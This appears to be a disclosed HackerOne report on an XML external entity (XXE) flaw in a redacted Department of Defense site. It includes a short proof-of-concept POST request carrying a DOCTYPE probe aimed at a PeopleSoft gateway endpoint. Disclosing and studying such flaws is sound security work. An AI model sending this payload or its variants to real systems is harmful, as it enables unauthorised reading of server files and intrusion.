# XXE in DoD website that may lead to RCE

## Report Details
- **Report ID**: 227880
- **URL**: https://hackerone.com/reports/227880
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-05-12T10:41:43.936Z
- **Disclosed**: 2019-10-04T15:22:27.419Z

## Reporter
- **Username**: jin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
XXE in https://█████

**Description:**
A malicious user can modify an XML-based request to include XML content that is then parsed locally.

## Impact
An attacker can use an XML external entity vulnerability to send specially crafted unauthorized XML requests, which will be processed by the XML parser. The attacker can use an XML external entity vulnerability for getting unauthorised access to the OS file system.

## PoC

```
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: https://███
Content-type: text/xml
Content-Length: 50

<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
```

## Attachments
No attachments
